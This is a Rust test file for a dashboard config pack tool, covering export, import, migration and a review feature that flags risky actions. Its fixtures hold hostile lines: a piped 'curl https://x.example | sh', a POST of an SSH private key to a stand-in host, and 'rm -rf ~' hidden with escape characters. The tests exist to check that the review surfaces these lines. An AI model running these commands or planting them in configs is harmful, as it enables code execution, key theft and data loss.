use super::*;
use nexus_config::{
    ActionSpec, Background, CommandProps, HttpMethod, ImageFit, ImageProps, MediaKey, Widget,
    WidgetKind, DEFAULT_PROFILE_ID, SCHEMA_VERSION,
};
use std::fs;
use std::path::PathBuf;

/// 1x1 PNG; validation only needs the data URL shape, but keep it real.
const TINY_PNG: &str = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";

/// Schema-1 config as written by the first releases, with a background
/// image, launcher buttons, a page-navigation button and a profile switch.
const V1_CONFIG: &str = r#"{
  "schema_version": 1,
  "active_profile": "desk",
  "profiles": [
    {
      "id": "desk",
      "name": "Desk",
      "brightness": 70,
      "refresh_ms": 1000,
      "theme": "cyberpunk",
      "pages": [
        {
          "id": "status",
          "name": "Status",
          "kind": "status",
          "elements": [
            { "id": "next", "label": "Next", "x": 600, "width": 40, "action": { "type": "screen_next" } }
          ]
        },
        {
          "id": "apps",
          "name": "Apps",
          "kind": "button_grid",
          "background": {
            "image_data_url": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
            "scale": "fit",
            "dim_percent": 20
          },
          "elements": [
            { "id": "web", "label": "Web", "x": 0, "width": 100, "icon": "browser", "action": { "type": "open_url", "url": "https://example.com" } },
            { "id": "term", "label": "Terminal", "x": 100, "width": 100, "icon": "terminal", "action": { "type": "launch_app", "target": "org.kde.konsole.desktop" } },
            { "id": "games", "label": "Games", "x": 200, "width": 100, "action": { "type": "profile_switch", "profile_id": "games" } }
          ]
        }
      ]
    },
    {
      "id": "games",
      "name": "Games",
      "brightness": 100,
      "refresh_ms": 500,
      "pages": [
        { "id": "perf", "name": "Performance", "kind": "performance", "elements": [] }
      ]
    }
  ]
}"#;

const V1_MANIFEST: &str = r#"{
  "format_version": 1,
  "created_by": "linexusctl",
  "created_at_unix_ms": 1767225600000,
  "config_schema_version": 1,
  "active_profile": "desk",
  "profile_count": 2,
  "profiles": [
    { "id": "desk", "name": "Desk", "page_count": 2 },
    { "id": "games", "name": "Games", "page_count": 1 }
  ],
  "resources": []
}"#;

#[test]
fn manifest_summarizes_default_config() {
    let config = nexus_config::default_config();
    let manifest = build_manifest(&config, "test");
    assert_eq!(manifest.format_version, PACK_FORMAT_VERSION);
    assert_eq!(manifest.config_schema_version, SCHEMA_VERSION);
    assert_eq!(manifest.profile_count, 1);
    assert_eq!(manifest.profiles[0].id, DEFAULT_PROFILE_ID);
    assert_eq!(manifest.profiles[0].page_count, 5);
    assert_eq!(manifest.embedded_images, 0);
    let json = serde_json::to_value(&manifest).unwrap();
    assert!(json.get("resources").is_none(), "format 2 drops resources");
}

#[test]
fn exports_inspects_and_imports_pack() {
    let dir = temp_dir("roundtrip");
    let config_path = dir.join("config.json");
    let pack_path = dir.join("profile.nexuspack");
    let imported_path = dir.join("imported.json");
    nexus_config::save_to_path(&config_path, &nexus_config::default_config(), true).unwrap();

    let exported = export_pack(&config_path, &pack_path, false).unwrap();
    let inspected = inspect_pack(&pack_path).unwrap();
    assert_eq!(inspected.profile_count, exported.profile_count);
    assert_eq!(inspected.profiles[0].page_count, 5);

    let report = import_pack(&pack_path, &imported_path, false, false).unwrap();
    assert_eq!(report.profile_count, 1);
    assert_eq!(report.page_count, 5);
    assert_eq!(report.migrated_from, None);
    assert!(report.notes.is_empty());
    let imported = nexus_config::load_from_path(&imported_path).unwrap();
    assert_eq!(imported, nexus_config::default_config());
}

#[test]
fn exported_pack_holds_only_manifest_and_config() {
    let dir = temp_dir("entries");
    let pack_path = dir.join("profile.nexuspack");
    export_config(&nexus_config::default_config(), &pack_path, false, "test").unwrap();

    let archive = ZipArchive::new(File::open(&pack_path).unwrap()).unwrap();
    let mut names: Vec<_> = archive.file_names().collect();
    names.sort_unstable();
    assert_eq!(names, [CONFIG_PATH, MANIFEST_PATH]);
}

#[test]
fn embedded_images_round_trip_and_are_counted() {
    let dir = temp_dir("images");
    let pack_path = dir.join("images.nexuspack");
    let target_path = dir.join("target.json");
    let mut config = nexus_config::default_config();
    let page = &mut config.profiles[0].pages[4];
    page.background = Some(Background {
        image: Some(TINY_PNG.into()),
        color: None,
        fit: ImageFit::Fill,
        dim_percent: 30,
    });
    let mut blank = nexus_config::template_page(nexus_config::PageTemplate::Blank, "logo");
    blank.widgets.push(Widget::new(
        "logo",
        0,
        96,
        WidgetKind::Image(ImageProps {
            src: TINY_PNG.into(),
            fit: ImageFit::Fit,
        }),
    ));
    config.profiles[0].pages.push(blank);

    let manifest = export_config(&config, &pack_path, false, "test").unwrap();
    assert_eq!(manifest.embedded_images, 2);
    assert_eq!(inspect_pack(&pack_path).unwrap().embedded_images, 2);
    import_pack(&pack_path, &target_path, false, false).unwrap();
    assert_eq!(nexus_config::load_from_path(&target_path).unwrap(), config);
}

#[test]
fn imports_format1_pack_and_upgrades_its_config() {
    let dir = temp_dir("v1");
    let pack_path = dir.join("old.nexuspack");
    let target_path = dir.join("target.json");
    write_raw_pack(&pack_path, V1_MANIFEST, V1_CONFIG, true);

    let inspected = inspect_pack(&pack_path).unwrap();
    assert_eq!(inspected.format_version, 1);
    assert_eq!(inspected.config_schema_version, 1);

    let report = import_pack(&pack_path, &target_path, false, false).unwrap();
    assert_eq!(report.migrated_from, Some(1));
    assert_eq!(report.active_profile, "desk");
    assert_eq!(report.profile_count, 2);
    assert_eq!(report.page_count, 3);

    let raw: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(&target_path).unwrap()).unwrap();
    assert_eq!(raw["schema_version"], SCHEMA_VERSION);
    let (config, migration) = nexus_config::load_with_report(&target_path).unwrap();
    assert!(migration.is_none(), "the written file is already current");

    let desk = &config.profiles[0];
    assert_eq!(desk.theme.preset, "neon");
    let apps = &desk.pages[1];
    let background = apps.background.as_ref().unwrap();
    assert!(background
        .image
        .as_deref()
        .unwrap()
        .starts_with("data:image/png"));
    assert_eq!(background.fit, ImageFit::Fit);
    let ids: Vec<_> = apps.widgets.iter().map(|w| w.id.as_str()).collect();
    assert_eq!(ids, ["web", "term", "games"]);
    assert!(
        !desk.pages[0].widgets.iter().any(|w| w.id == "next"),
        "page-navigation buttons are dropped"
    );
}

#[test]
fn dry_run_import_does_not_write_config() {
    let dir = temp_dir("dry-run");
    let config_path = dir.join("config.json");
    let pack_path = dir.join("profile.nexuspack");
    let target_path = dir.join("target.json");
    nexus_config::save_to_path(&config_path, &nexus_config::default_config(), true).unwrap();
    export_pack(&config_path, &pack_path, false).unwrap();

    let report = import_pack(&pack_path, &target_path, false, true).unwrap();
    assert!(report.dry_run);
    assert!(!target_path.exists());
}

#[test]
fn import_with_force_replaces_existing_config() {
    let dir = temp_dir("force");
    let pack_path = dir.join("profile.nexuspack");
    let target_path = dir.join("target.json");
    write_raw_pack(&pack_path, V1_MANIFEST, V1_CONFIG, false);
    nexus_config::save_to_path(&target_path, &nexus_config::default_config(), true).unwrap();

    import_pack(&pack_path, &target_path, true, false).unwrap();
    let config = nexus_config::load_from_path(&target_path).unwrap();
    assert_eq!(config.active_profile, "desk");
}

#[test]
fn refuses_to_overwrite_without_force() {
    let dir = temp_dir("overwrite");
    let config_path = dir.join("config.json");
    let pack_path = dir.join("profile.nexuspack");
    nexus_config::save_to_path(&config_path, &nexus_config::default_config(), true).unwrap();
    export_pack(&config_path, &pack_path, false).unwrap();

    let err = export_pack(&config_path, &pack_path, false).unwrap_err();
    assert!(err.to_string().contains("already exists"));
}

#[test]
fn corrupt_pack_does_not_create_target() {
    let dir = temp_dir("corrupt");
    let pack_path = dir.join("bad.nexuspack");
    let target_path = dir.join("target.json");
    fs::write(&pack_path, b"not a zip").unwrap();

    assert!(import_pack(&pack_path, &target_path, false, false).is_err());
    assert!(!target_path.exists());
}

#[test]
fn import_rejects_manifest_config_mismatch_without_writing() {
    let dir = temp_dir("mismatch");
    let pack_path = dir.join("mismatch.nexuspack");
    let target_path = dir.join("target.json");
    let config = nexus_config::default_config();
    let mut manifest = build_manifest(&config, "test");
    manifest.active_profile = "different".into();
    write_test_pack(&pack_path, &manifest, &config, CompressionMethod::Stored);

    let err = import_pack(&pack_path, &target_path, false, false).unwrap_err();
    assert!(err.to_string().contains("active_profile"));
    assert!(!target_path.exists());
}

#[test]
fn inspect_rejects_manifest_config_mismatch() {
    let dir = temp_dir("inspect-mismatch");
    let pack_path = dir.join("mismatch.nexuspack");
    let config = nexus_config::default_config();
    let mut manifest = build_manifest(&config, "test");
    manifest.profile_count = 0;
    write_test_pack(&pack_path, &manifest, &config, CompressionMethod::Stored);

    let err = inspect_pack(&pack_path).unwrap_err();
    assert!(err.to_string().contains("profile_count"));
}

#[test]
fn inspect_rejects_wrong_image_count() {
    let dir = temp_dir("image-count");
    let pack_path = dir.join("images.nexuspack");
    let config = nexus_config::default_config();
    let mut manifest = build_manifest(&config, "test");
    manifest.embedded_images = 3;
    write_test_pack(&pack_path, &manifest, &config, CompressionMethod::Stored);

    let err = inspect_pack(&pack_path).unwrap_err();
    assert!(err.to_string().contains("embedded_images"));
}

#[test]
fn rejects_unknown_future_format() {
    let dir = temp_dir("future");
    let pack_path = dir.join("future.nexuspack");
    let config = nexus_config::default_config();
    let mut manifest = build_manifest(&config, "test");
    manifest.format_version = PACK_FORMAT_VERSION + 1;
    write_test_pack(&pack_path, &manifest, &config, CompressionMethod::Stored);

    let err = inspect_pack(&pack_path).unwrap_err();
    assert!(err.to_string().contains("format_version"));
}

#[test]
fn dry_run_refuses_existing_target_without_force() {
    let dir = temp_dir("dry-run-existing");
    let config_path = dir.join("config.json");
    let pack_path = dir.join("profile.nexuspack");
    let target_path = dir.join("target.json");
    nexus_config::save_to_path(&config_path, &nexus_config::default_config(), true).unwrap();
    nexus_config::save_to_path(&target_path, &nexus_config::default_config(), true).unwrap();
    export_pack(&config_path, &pack_path, false).unwrap();

    let err = import_pack(&pack_path, &target_path, false, true).unwrap_err();
    assert!(err.to_string().contains("already exists"));
}

#[test]
fn imports_stored_zip_pack() {
    let dir = temp_dir("stored");
    let pack_path = dir.join("stored.nexuspack");
    let target_path = dir.join("target.json");
    let config = nexus_config::default_config();
    let manifest = build_manifest(&config, "test");
    write_test_pack(&pack_path, &manifest, &config, CompressionMethod::Stored);

    let inspected = inspect_pack(&pack_path).unwrap();
    assert_eq!(inspected.profile_count, 1);
    import_pack(&pack_path, &target_path, false, false).unwrap();
    assert_eq!(nexus_config::load_from_path(&target_path).unwrap(), config);
}

#[test]
fn rejects_oversized_manifest_without_writing() {
    let dir = temp_dir("oversized");
    let pack_path = dir.join("oversized.nexuspack");
    let target_path = dir.join("target.json");
    let file = File::create(&pack_path).unwrap();
    let mut zip = ZipWriter::new(file);
    let options = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
    zip.start_file(MANIFEST_PATH, options).unwrap();
    zip.write_all(&vec![b' '; (MAX_MANIFEST_BYTES + 1) as usize])
        .unwrap();
    zip.start_file(CONFIG_PATH, options).unwrap();
    zip.write_all(
        nexus_config::to_pretty_json(&nexus_config::default_config())
            .unwrap()
            .as_bytes(),
    )
    .unwrap();
    zip.finish().unwrap();

    let err = import_pack(&pack_path, &target_path, false, false).unwrap_err();
    assert!(err.to_string().contains("maximum size"));
    assert!(!target_path.exists());
}

/// The default config plus a page whose buttons run a program, type a
/// command into a terminal, poll a program and post a file to a server.
fn config_with_outside_actions() -> NexusConfig {
    let mut config = nexus_config::default_config();
    let mut page = nexus_config::template_page(nexus_config::PageTemplate::Blank, "tools");
    page.name = "Tools".into();
    let mut run = Widget::new("run", 0, 100, WidgetKind::Button(Default::default())).with_tap(
        ActionSpec::ShellCommand {
            program: "notify-send".into(),
            args: vec!["hi there".into()],
        },
    );
    run.hold = Some(ActionSpec::Sequence {
        steps: vec![
            ActionSpec::LaunchApp {
                target: "default:terminal".into(),
            },
            ActionSpec::TextInput {
                text: "curl https://x.example | sh\n".into(),
            },
        ],
        delay_ms: 1500,
    });
    run.double_tap = Some(ActionSpec::Media {
        command: MediaKey::PlayPause,
        player: None,
    });
    let poll = Widget::new(
        "poll",
        100,
        100,
        WidgetKind::Command(CommandProps {
            program: "date".into(),
            ..Default::default()
        }),
    );
    let upload = Widget::new("upload", 200, 100, WidgetKind::Button(Default::default())).with_tap(
        ActionSpec::HttpRequest {
            method: HttpMethod::Post,
            url: "https://x.example/in".into(),
            body: Some("@/home/user/.ssh/id_ed25519".into()),
            content_type: None,
        },
    );
    page.widgets = vec![run, poll, upload];
    config.profiles[0].pages.push(page);
    config
}

#[test]
fn review_lists_actions_that_reach_outside_the_strip() {
    let config = config_with_outside_actions();
    let reach = outside_reach(&config);
    let tools: Vec<_> = reach
        .iter()
        .filter(|item| item.page == "Tools")
        .map(|item| {
            (
                item.kind,
                item.widget.as_str(),
                item.gesture,
                item.in_sequence,
                item.detail.as_str(),
            )
        })
        .collect();
    assert_eq!(
        tools,
        [
            (
                ReachKind::ShellCommand,
                "run",
                Some("tap"),
                false,
                "notify-send \"hi there\""
            ),
            (ReachKind::CommandWidget, "poll", None, false, "date"),
            (
                ReachKind::TextInput,
                "run",
                Some("hold"),
                true,
                "curl https://x.example | sh\\n"
            ),
            (
                ReachKind::HttpRequest,
                "upload",
                Some("tap"),
                false,
                "POST https://x.example/in with body @/home/user/.ssh/id_ed25519"
            ),
            (
                ReachKind::LaunchApp,
                "run",
                Some("hold"),
                true,
                "default:terminal"
            ),
        ]
    );
    assert!(
        reach.windows(2).all(|pair| pair[0].kind <= pair[1].kind),
        "grouped by kind"
    );
    let json = serde_json::to_value(&reach[0]).unwrap();
    assert_eq!(json["kind"], "shell_command");
}

#[test]
fn review_text_cannot_hide_or_fake_lines() {
    let mut config = config_with_outside_actions();
    config.profiles[0].name = "Desk\u{1b}[1A\u{1b}[2K\u{202e}".into();
    let typed = format!("{}\nrm -rf ~\n{}", "a".repeat(700), "b".repeat(700));
    config.profiles[0].pages[5].widgets[0].tap = Some(ActionSpec::TextInput { text: typed });
    let reach = outside_reach(&config);
    let text = reach
        .iter()
        .find(|item| item.kind == ReachKind::TextInput && item.gesture == Some("tap"))
        .unwrap();
    assert_eq!(text.profile, "Desk\\u{1b}[1A\\u{1b}[2K\\u{202e}");
    assert!(
        reach
            .iter()
            .all(|item| !item.profile.chars().any(char::is_control)),
        "no raw escape characters"
    );
    assert!(
        text.detail.contains("[… 612 more characters not shown …]"),
        "{}",
        text.detail
    );
    assert!(text.detail.starts_with("aaa") && text.detail.ends_with("bbb"));
}

#[test]
fn review_pack_describes_without_writing() {
    let dir = temp_dir("review");
    let pack_path = dir.join("tools.nexuspack");
    let config = config_with_outside_actions();
    export_config(&config, &pack_path, false, "test").unwrap();

    let review = review_pack(&pack_path).unwrap();
    assert_eq!(review.active_profile, config.active_profile);
    assert_eq!(review.profiles[0].page_count, 6);
    assert_eq!(review.page_count, 6);
    assert_eq!(review.reach, outside_reach(&config));
    assert_eq!(fs::read_dir(&dir).unwrap().count(), 1, "only the pack");
}

#[test]
fn import_backs_up_the_replaced_config() {
    let dir = temp_dir("backup");
    let pack_path = dir.join("profile.nexuspack");
    let target_path = dir.join("config.json");
    write_raw_pack(&pack_path, V1_MANIFEST, V1_CONFIG, false);
    nexus_config::save_to_path(&target_path, &nexus_config::default_config(), true).unwrap();
    let before = fs::read(&target_path).unwrap();

    let dry = import_pack(&pack_path, &target_path, true, true).unwrap();
    assert_eq!(dry.backup_path, None, "a dry run writes nothing");
    let report = import_pack(&pack_path, &target_path, true, false).unwrap();
    let backup = dir.join("config.json.bak");
    assert_eq!(report.backup_path.as_deref(), Some(backup.as_path()));
    assert_eq!(fs::read(&backup).unwrap(), before);
    assert_ne!(fs::read(&target_path).unwrap(), before);

    let fresh = dir.join("fresh.json");
    let report = import_pack(&pack_path, &fresh, false, false).unwrap();
    assert_eq!(report.backup_path, None, "nothing to back up");
}

#[test]
fn rejects_configs_studio_could_not_save() {
    let dir = temp_dir("too-large");
    let pack_path = dir.join("big.nexuspack");
    let target_path = dir.join("target.json");
    let mut config = nexus_config::default_config();
    let image = format!("data:image/png;base64,{}", "A".repeat(2_900_000));
    let mut page = nexus_config::template_page(nexus_config::PageTemplate::Blank, "photos");
    page.widgets = (0..6)
        .map(|i| {
            let src = image.clone();
            let kind = WidgetKind::Image(ImageProps {
                src,
                fit: ImageFit::Fit,
            });
            Widget::new(format!("photo-{i}"), i * 100, 100, kind)
        })
        .collect();
    config.profiles[0].pages.push(page);
    let err = export_config(&config, &pack_path, false, "test").unwrap_err();
    assert!(err.to_string().contains("Linexus Studio can save"), "{err}");
    assert!(!pack_path.exists());

    // A pack made by something else is refused on the way in.
    let manifest = build_manifest(&config, "test");
    write_test_pack(&pack_path, &manifest, &config, CompressionMethod::Deflated);
    let err = review_pack(&pack_path).unwrap_err();
    assert!(err.to_string().contains("Linexus Studio can save"), "{err}");
    let err = import_pack(&pack_path, &target_path, false, false).unwrap_err();
    assert!(err.to_string().contains("Linexus Studio can save"), "{err}");
    assert!(!target_path.exists());
}

fn write_test_pack(
    pack_path: &Path,
    manifest: &PackManifest,
    config: &NexusConfig,
    compression: CompressionMethod,
) {
    let file = File::create(pack_path).unwrap();
    let mut zip = ZipWriter::new(file);
    let options = SimpleFileOptions::default().compression_method(compression);
    zip.start_file(MANIFEST_PATH, options).unwrap();
    zip.write_all(&serde_json::to_vec_pretty(manifest).unwrap())
        .unwrap();
    zip.start_file(CONFIG_PATH, options).unwrap();
    zip.write_all(nexus_config::to_pretty_json(config).unwrap().as_bytes())
        .unwrap();
    zip.finish().unwrap();
}

/// Writes a pack the way format 1 did, optionally with its empty
/// `resources/` folder.
fn write_raw_pack(pack_path: &Path, manifest: &str, config: &str, resources_dir: bool) {
    let file = File::create(pack_path).unwrap();
    let mut zip = ZipWriter::new(file);
    let options = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
    zip.start_file(MANIFEST_PATH, options).unwrap();
    zip.write_all(manifest.as_bytes()).unwrap();
    zip.start_file(CONFIG_PATH, options).unwrap();
    zip.write_all(config.as_bytes()).unwrap();
    if resources_dir {
        zip.add_directory("resources/", options).unwrap();
    }
    zip.finish().unwrap();
}

fn temp_dir(name: &str) -> PathBuf {
    let mut path = std::env::temp_dir();
    path.push(format!(
        "nexus-pack-test-{name}-{}-{}",
        std::process::id(),
        now_unix_ms()
    ));
    let _ = fs::remove_dir_all(&path);
    fs::create_dir_all(&path).unwrap();
    path
}
